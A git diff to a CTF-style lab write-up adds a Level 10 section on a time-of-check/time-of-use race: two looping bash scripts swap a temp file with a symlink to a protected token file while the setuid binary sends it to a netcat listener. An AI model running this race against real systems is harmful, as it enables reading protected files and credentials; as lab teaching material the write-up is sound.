@@ -68,11 +68,11 @@ We ran ls -la and noticed that this time we have a file to analyse : level02.pca
 
 After some research we found out that the extension stands for packet capture, and we can use wireshark to analyse it, since we cannot use a vm file outside the vm, we had to copy it outside the vm with this command : 
 
-scp -P 4242 level02@10.11.108.2:/home/user/level02/level02.pcap /home/dnahon/Documents
+**scp -P 4242 level02@10.11.108.2:/home/user/level02/level02.pcap /home/dnahon/Documents**
 
-We then opened the file in wireshark, we right clicked on a packet -> Follow -> TCP Stream.
+**We then opened the file in wireshark, we right clicked on a packet -> Follow -> TCP Stream.**
 
-We picked show data as : Hex dump, and here is the result : 
+**We picked show data as : Hex dump**, and here is the result : 
 
 ![Level02-00](img/Level02-00.png)
 
@@ -233,3 +233,45 @@ int	main(int ac, char **av)
 After transfering it to the vm by using the scp command and compiling it, we could test it with the token file content :
 
 ![Level09-01](img/Level09-01.png)
+
+# Level 10
+
+We started with checking what files we have in the current level folder, we have a token file which we dont have permission to open and a binary that we ran the strings command on.
+
+![Level10-00](img/Level10-00.png)
+
+We can see the access function but we dont know how it works yet, so we ran man access.
+
+![Level10-01](img/Level10-01.png)
+
+So it says that we need to exploit the short time interval between access and open to be able to send the file content.
+
+To try and bypass this interval, we made a script that will create a file, delete the file, create a symbolic link with the token file, and delete the file again continuously. And have another script that continously try to send that file to our local ip which you can find in ip addr show.
+
+By doing that, at the moment access check if we have permission to read the file, if it happens during the time that the file is the one made by touch since we have permissions, it will continue to run the binary but at the same time it checked for the permission, the file was replaced by the token file via a symbolic link.
+
+```sh
+#!/bin/bash
+
+while (true); do
+    ./level10 /tmp/file 192.168.122.1
+done
+```
+
+and
+
+```sh
+#!/bin/bash
+
+while (true); do
+    touch /tmp/file
+    rm -f /tmp/file
+    ln -s /home/user/level10/token /tmp/file
+    rm -f /tmp/file
+done
+```
+
+We then need to run **nc -lk 6969**, **-l** will allow netcat to await for connections and **-k** will allow netcat to continously await for connections even when a connection has already been made.
+
+After waiting a few seconds, we can stop the 2 scripts and check for results in nc :
+![Level10-02](img/Level10-02.png)
